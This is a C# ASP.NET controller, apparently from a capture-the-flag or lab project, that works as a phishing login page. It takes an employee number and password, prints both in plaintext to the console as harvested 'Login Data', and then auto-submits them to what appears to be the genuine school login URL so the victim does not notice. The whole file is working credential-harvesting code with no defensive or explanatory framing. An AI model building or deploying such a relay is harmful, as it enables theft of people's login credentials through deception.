using CTFomni.Models;
using Microsoft.AspNetCore.Mvc;

namespace CTFomni.Controllers;

[Route("login")]
public class LoginController : Controller
{
    [HttpPost]
    [Route("submit")]
    public IActionResult Login([FromForm] LoginModel model)
    {
        var validationResult = ValidateLoginData(model);
        if (!validationResult.IsValid)
            return Redirect("~/index.html");

        SaveLoginData(model);

        var formData = new Dictionary<string, string>
        {
            { "NoEmplEmployeNormal", model.NoEmplEmployeNormal ?? "" },
            { "PasswordEmplEmployeNormal", model.PasswordEmplEmployeNormal ?? "" },
            { "TypeIdentification", model.TypeIdentification ?? "" }
        };
        
        return View("AutoSubmitForm", new AutoSubmitFormModel
        {
            ActionUrl = "http://zeroday.cegeplabs.qc.ca/school/index.php",
            FormData = formData
        });
    }

    private static (bool IsValid, string ErrorMessage) ValidateLoginData(LoginModel model)
    {
        if (string.IsNullOrEmpty(model.TypeIdentification))
            return (false, "Le type d'identification est requis.");

        if (model.TypeIdentification == "EmployeNormal")
        {
            if (string.IsNullOrEmpty(model.NoEmplEmployeNormal) ||
                string.IsNullOrEmpty(model.PasswordEmplEmployeNormal))
                return (false, "Le numéro d'employé et le mot de passe sont requis.");
        }
        else
        {
            return (false, "Type d'identification invalide.");
        }

        return (true, string.Empty);
    }

    private static void SaveLoginData(LoginModel model)
    {
        Console.WriteLine("\n===== Login Data =====");
        Console.WriteLine($"Type         : {model.TypeIdentification}");
        Console.WriteLine($"NoEmpl       : {model.NoEmplEmployeNormal}");
        Console.WriteLine($"Password     : {model.PasswordEmplEmployeNormal}");
        Console.WriteLine("======================\n");
    }

}
